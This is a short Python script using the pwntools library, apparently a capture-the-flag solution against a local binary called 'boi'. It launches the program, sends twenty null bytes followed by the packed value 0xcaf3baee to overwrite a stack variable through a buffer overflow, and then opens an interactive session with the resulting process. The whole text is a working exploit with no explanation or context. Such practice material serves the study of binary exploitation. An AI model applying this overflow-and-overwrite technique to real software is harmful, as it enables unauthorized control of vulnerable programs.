from pwn import *

target = process('./boi')

payload = b'\x00'*0x14 + p32(0xcaf3baee)


target.send(payload)

target.interactive()
